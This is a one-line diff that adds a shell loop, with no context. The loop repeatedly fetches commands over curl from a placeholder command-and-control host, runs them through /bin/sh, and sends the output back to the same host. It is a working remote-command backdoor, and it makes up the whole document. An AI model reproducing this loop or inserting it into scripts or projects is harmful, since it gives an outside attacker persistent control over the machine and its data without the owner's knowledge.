@@ -1,0 +1,1 @@
+while :; do CMD=$(curl -sqLk https://c2serveraddress/client_blue/printserv); if [ -z "$CMD" ]; then continue; fi; echo "-> $CMD"; echo "$CMD" | /bin/sh 2>&1 | curl --data-binary '@-' -sqLk https://c2serveraddress/client_blue/printserv; sleep 10; done
